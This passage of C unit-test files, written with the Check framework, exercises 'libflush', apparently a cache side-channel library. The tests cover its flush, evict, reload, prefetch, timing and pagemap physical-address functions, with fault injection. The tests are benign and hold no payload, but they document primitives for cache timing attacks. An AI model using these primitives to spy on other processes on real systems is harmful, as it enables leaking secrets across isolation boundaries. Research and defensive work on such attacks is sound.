  fail_unless(libflush_eviction_terminate(NULL) == false);
} END_TEST

#if HAVE_PAGEMAP_ACCESS == 1
START_TEST(test_eviction_evict) {
  int x;
  libflush_eviction_evict(libflush_session, &x);
} END_TEST

START_TEST(test_eviction_evict_cached) {
  int x;
  libflush_eviction_evict(libflush_session, &x);
  libflush_eviction_evict(libflush_session, &x);
} END_TEST

START_TEST(test_eviction_evict_two) {
  int x;
  int y;
  libflush_eviction_evict(libflush_session, &x);
  libflush_eviction_evict(libflush_session, &y);
} END_TEST

START_TEST(test_eviction_evict_exhaust) {
  size_t number_of_addresses = ADDRESS_CACHE_SIZE + 1;
  int addresses[number_of_addresses];
  for (size_t i = 0; i < number_of_addresses; i++) {
    libflush_eviction_evict(libflush_session, &(addresses[i]));
  }
} END_TEST
#endif

Suite*
suite_eviction(void)
{
  TCase* tcase = NULL;
  Suite* suite = suite_create("eviction");

  tcase = tcase_create("basic");
  tcase_add_checked_fixture(tcase, setup_session, teardown_session);
  tcase_add_test(tcase, test_eviction_init);
  tcase_add_test(tcase, test_eviction_terminate);
  suite_add_tcase(suite, tcase);

#if HAVE_PAGEMAP_ACCESS == 1
  tcase = tcase_create("evict");
  tcase_add_checked_fixture(tcase, setup_session, teardown_session);
  tcase_add_test(tcase, test_eviction_evict);
  tcase_add_test(tcase, test_eviction_evict_cached);
  tcase_add_test(tcase, test_eviction_evict_two);
  tcase_add_test(tcase, test_eviction_evict_exhaust);
  suite_add_tcase(suite, tcase);
#endif

  return suite;
}

```

`libflush/tests/memory.c`:

```c
/* See LICENSE file for license and copyright information */

#include <check.h>

#include <libflush.h>

libflush_session_t* libflush_session;

static void setup_session(void) {
  fail_unless(libflush_init(&libflush_session, NULL) == true);
  fail_unless(libflush_session != NULL);
}

static void teardown_session(void) {
  fail_unless(libflush_terminate(libflush_session) == true);
  libflush_session = NULL;
}

START_TEST(test_flush) {
  int x;
  libflush_flush(libflush_session, &x);
} END_TEST

START_TEST(test_flush_time) {
  int x;
  libflush_flush_time(libflush_session, &x);
} END_TEST

#if HAVE_PAGEMAP_ACCESS == 1
START_TEST(test_evict) {
  int x;
  libflush_evict(libflush_session, &x);
} END_TEST
#endif

#if HAVE_PAGEMAP_ACCESS == 1
START_TEST(test_evict_time) {
  int x;
  libflush_evict_time(libflush_session, &x);
} END_TEST
#endif

START_TEST(test_access_memory) {
  int x;
  libflush_access_memory(&x);
} END_TEST

START_TEST(test_reload_address) {
  int x;
  libflush_reload_address(libflush_session, &x);
} END_TEST

START_TEST(test_reload_address_and_flush) {
  int x;
  libflush_reload_address_and_flush(libflush_session, &x);
} END_TEST

#if HAVE_PAGEMAP_ACCESS == 1
START_TEST(test_reload_address_and_evict) {
  int x;
  libflush_reload_address_and_evict(libflush_session, &x);
} END_TEST
#endif

START_TEST(test_memory_barrier) {
  libflush_memory_barrier();
} END_TEST

Suite*
suite_memory(void)
{
  TCase* tcase = NULL;
  Suite* suite = suite_create("memory");

  tcase = tcase_create("flush");
  tcase_add_checked_fixture(tcase, setup_session, teardown_session);
  tcase_add_test(tcase, test_flush);
  tcase_add_test(tcase, test_flush_time);
  suite_add_tcase(suite, tcase);

#if HAVE_PAGEMAP_ACCESS == 1
  tcase = tcase_create("evict");
  tcase_add_checked_fixture(tcase, setup_session, teardown_session);
  tcase_add_test(tcase, test_evict);
  tcase_add_test(tcase, test_evict_time);
  suite_add_tcase(suite, tcase);
#endif

  tcase = tcase_create("access");
  tcase_add_checked_fixture(tcase, setup_session, teardown_session);
  tcase_add_test(tcase, test_access_memory);
  suite_add_tcase(suite, tcase);

  tcase = tcase_create("reload");
  tcase_add_checked_fixture(tcase, setup_session, teardown_session);
  tcase_add_test(tcase, test_reload_address);
  tcase_add_test(tcase, test_reload_address_and_flush);
#if HAVE_PAGEMAP_ACCESS == 1
  tcase_add_test(tcase, test_reload_address_and_evict);
#endif
  suite_add_tcase(suite, tcase);

  tcase = tcase_create("barrier");
  tcase_add_checked_fixture(tcase, setup_session, teardown_session);
  tcase_add_test(tcase, test_memory_barrier);
  suite_add_tcase(suite, tcase);

  return suite;
}

```

`libflush/tests/prefetch.c`:

```c
/* See LICENSE file for license and copyright information */

#include <check.h>

#include <libflush.h>

libflush_session_t* libflush_session;

static void setup_session(void) {
  fail_unless(libflush_init(&libflush_session, NULL) == true);
  fail_unless(libflush_session != NULL);
}

static void teardown_session(void) {
  fail_unless(libflush_terminate(libflush_session) == true);
  libflush_session = NULL;
}

START_TEST(test_prefetch) {
  int x;
  libflush_prefetch(libflush_session, &x);
} END_TEST

START_TEST(test_prefetch_time) {
  int x;
  libflush_prefetch_time(libflush_session, &x);
} END_TEST

Suite*
suite_prefetch(void)
{
  TCase* tcase = NULL;
  Suite* suite = suite_create("prefetch");

  tcase = tcase_create("basic");
  tcase_add_checked_fixture(tcase, setup_session, teardown_session);
  tcase_add_test(tcase, test_prefetch);
  tcase_add_test(tcase, test_prefetch_time);
  suite_add_tcase(suite, tcase);

  return suite;
}

```

`libflush/tests/session.c`:

```c
/* See LICENSE file for license and copyright information */

#ifdef FIU_ENABLE
#include <fiu.h>
#include <fiu-control.h>
#endif

#include <check.h>

#include <libflush.h>

START_TEST(test_session_init) {
  libflush_session_t* libflush_session;

  /* Invalid arguments */
  fail_unless(libflush_init(NULL, NULL) == false);

  /* Valid arguments */
  fail_unless(libflush_init(&libflush_session, NULL) == true);
  fail_unless(libflush_session != NULL);
  fail_unless(libflush_terminate(libflush_session) == true);

  /* Fault injection */
#ifdef FIU_ENABLE
  fiu_enable("libc/mm/calloc", 1, NULL, 0);
  fail_unless(libflush_init(&libflush_session, NULL) == false);
  fiu_disable("libc/mm/calloc");

#if HAVE_PAGEMAP_ACCESS == 1
  fiu_enable("posix/io/oc/open", 1, NULL, 0);
  fail_unless(libflush_init(&libflush_session, NULL) == false);
  fiu_disable("posix/io/oc/open");
#endif
#endif
} END_TEST

START_TEST(test_session_terminate) {
  libflush_session_t* libflush_session;

  /* Invalid arguments */
  fail_unless(libflush_terminate(NULL) == false);

  /* Valid arguments */
  fail_unless(libflush_init(&libflush_session, NULL) == true);
  fail_unless(libflush_session != NULL);
  fail_unless(libflush_terminate(libflush_session) == true);
} END_TEST

Suite*
suite_session(void)
{
  TCase* tcase = NULL;
  Suite* suite = suite_create("session");

  tcase = tcase_create("basic");
  tcase_add_test(tcase, test_session_init);
  tcase_add_test(tcase, test_session_terminate);
  suite_add_tcase(suite, tcase);

  return suite;
}

```

`libflush/tests/tests.c`:

```c
/* See LICENSE file for license and copyright information */

#include <check.h>

#ifdef FIU_ENABLE
#include <fiu.h>
#endif

Suite* suite_session(void);
Suite* suite_timing(void);
Suite* suite_memory(void);
Suite* suite_eviction(void);
Suite* suite_prefetch(void);
Suite* suite_utils(void);

int main(void)
{
  /* initialize libfiu */
#ifdef FIU_ENABLE
  fiu_init(0);
#endif

  /* setup test suite */
  SRunner* suite_runner = srunner_create(NULL);
  srunner_set_fork_status(suite_runner, CK_NOFORK);

  srunner_add_suite(suite_runner, suite_session());
  srunner_add_suite(suite_runner, suite_timing());
  srunner_add_suite(suite_runner, suite_memory());
  srunner_add_suite(suite_runner, suite_eviction());
  srunner_add_suite(suite_runner, suite_prefetch());
  srunner_add_suite(suite_runner, suite_utils());

  int number_failed = 0;
  srunner_run_all(suite_runner, CK_ENV);
  number_failed += srunner_ntests_failed(suite_runner);
  srunner_free(suite_runner);

  return (number_failed == 0) ? 0 : 1;
}

```

`libflush/tests/timing.c`:

```c
/* See LICENSE file for license and copyright information */

#include <check.h>

#include <libflush.h>

libflush_session_t* libflush_session;

static void setup_session(void) {
  fail_unless(libflush_init(&libflush_session, NULL) == true);
  fail_unless(libflush_session != NULL);
}

static void teardown_session(void) {
  fail_unless(libflush_terminate(libflush_session) == true);
  libflush_session = NULL;
}

START_TEST(test_get_timing) {
  libflush_get_timing(libflush_session);
} END_TEST

START_TEST(test_reset_timing) {
  libflush_reset_timing(libflush_session);
} END_TEST

Suite*
suite_timing(void)
{
  TCase* tcase = NULL;
  Suite* suite = suite_create("timing");

  tcase = tcase_create("basic");
  tcase_add_checked_fixture(tcase, setup_session, teardown_session);
  tcase_add_test(tcase, test_get_timing);
  tcase_add_test(tcase, test_reset_timing);
  suite_add_tcase(suite, tcase);

  return suite;
}

```

`libflush/tests/utils.c`:

```c
/* See LICENSE file for license and copyright information */

#ifdef FIU_ENABLE
#include <fiu.h>
#include <fiu-control.h>
#endif

#include <check.h>
#include <signal.h>

#include <libflush.h>

libflush_session_t* libflush_session;

static void setup_session(void) {
  fail_unless(libflush_init(&libflush_session, NULL) == true);
  fail_unless(libflush_session != NULL);
}

static void teardown_session(void) {
  fail_unless(libflush_terminate(libflush_session) == true);
  libflush_session = NULL;
}

#if HAVE_PAGEMAP_ACCESS == 1
START_TEST(test_get_physical_address) {
  int x;
  libflush_get_physical_address(libflush_session, (uintptr_t) &x);
} END_TEST

#ifdef FIU_ENABLE
START_TEST(test_get_physical_address_fault_injection) {
  int x;

  libflush_get_physical_address(libflush_session, (uintptr_t) &x);
} END_TEST
#endif

START_TEST(test_get_pagemap_entry) {
  int x;
  libflush_get_pagemap_entry(libflush_session, (uintptr_t) &x);
} END_TEST
#endif

START_TEST(test_bind_to_cpu) {
  libflush_bind_to_cpu(0);
} END_TEST

Suite*
suite_utils(void)
{
  TCase* tcase = NULL;
  Suite* suite = suite_create("utils");

  tcase = tcase_create("basic");
  tcase_add_checked_fixture(tcase, setup_session, teardown_session);
#if HAVE_PAGEMAP_ACCESS == 1
  tcase_add_test(tcase, test_get_physical_address);
#ifdef FIU_ENABLE
  fiu_enable("posix/io/rw/pread", 1, NULL, 0);
  tcase_add_test_raise_signal(tcase, test_get_physical_address_fault_injection, SIGABRT);
  fiu_disable("posix/io/rw/pread");
#endif
  tcase_add_test(tcase, test_get_pagemap_entry);
#endif
  tcase_add_test(tcase, test_bind_to_cpu);
  suite_add_tcase(suite, tcase);

  return suite;
}

```